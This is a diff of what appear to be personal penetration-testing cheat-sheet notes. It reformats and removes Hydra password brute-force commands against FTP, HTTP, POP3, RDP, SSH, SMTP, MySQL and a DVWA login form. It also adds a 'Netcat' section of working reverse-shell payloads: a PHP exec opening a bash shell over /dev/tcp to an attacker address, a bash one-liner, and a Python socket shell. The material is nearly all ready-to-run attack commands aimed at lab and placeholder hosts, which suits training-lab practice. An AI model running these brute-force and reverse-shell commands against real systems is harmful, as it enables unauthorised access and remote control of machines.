@@ -49,37 +49,19 @@
 - __```hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  127.0.0.1 ftp```__
 - __```hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /root/Desktop/wordlists/100-common-passwords.txt 127.0.0.1 http-get /digest/```__
 - __`hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get /`__
+- **`hydra -C <combinations.txt> <ip> <service>`**
 
-- `hydra -C <combinations.txt> <ip> <service>`
-- ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ipaddress> ssh -t 50```
-- ```hydra -L users.txt -P passwords.txt ssh://192.168.245.48 -t 4 > hydra.txt```
-- ```hydra -l root -P /usr/share/wordlists/rockyou.txt $ip mysql```
-```
-hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 ftp
-```
-```
-hydra -L/usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 ftp
-```
 ### Hydra POP3 Brute Force
-```
-hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 -s 4567 pop3
-```
+
+- **`hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 -s 4567 pop3`**
+
 ### Hydra RDP
-```
-hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>
-```
-### Hydra SMTP Brute Force
-```
-hydra -P /usr/share/wordlists/rockyou.txt 127.0.0.1 smtp -V
-```
-### Hydra SSH Brute Force
-```
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
-```
+- **`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>`**
+
+
 ### Brute Forcing a Website Login
 - Login page 
 - http://127.0.0.0/DVWA/vulnerabilities/brute/index.php
-
 - `hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"`
 
 
@@ -291,4 +273,18 @@ Apache Tomcat 8080
  
 - use ```[]==``` for the password if you don't know the pass 
 
+
+
+
+## Netcat(nc)
+```php
+<?php
+ exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
+?>
+```
+- __`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`__
+
+```py
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Your_ip>",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
+```
 
